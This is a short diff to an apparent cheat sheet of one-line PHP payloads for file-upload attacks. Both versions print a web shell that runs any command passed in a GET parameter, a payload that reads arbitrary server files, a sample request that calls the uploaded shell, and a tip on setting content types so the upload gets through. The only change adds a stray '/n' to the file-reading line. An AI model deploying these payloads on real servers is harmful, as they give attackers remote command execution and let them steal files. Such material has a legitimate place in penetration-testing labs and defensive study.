@@ -1,6 +1,6 @@
 PHP Files one line code 
 
-<?php echo file_get_contents('/path/to/target/file'); ?>        //user text/plain and application/x-httpd-php  when upload the php//
+<?php echo file_get_contents('/path/to/target/file'); ?> /n       //user text/plain and application/x-httpd-php  when upload the php//
 <?php echo system($_GET['command']); ?>
 GET /example/exploit.php?command=id HTTP/1.1     //in place id enter the command//
 
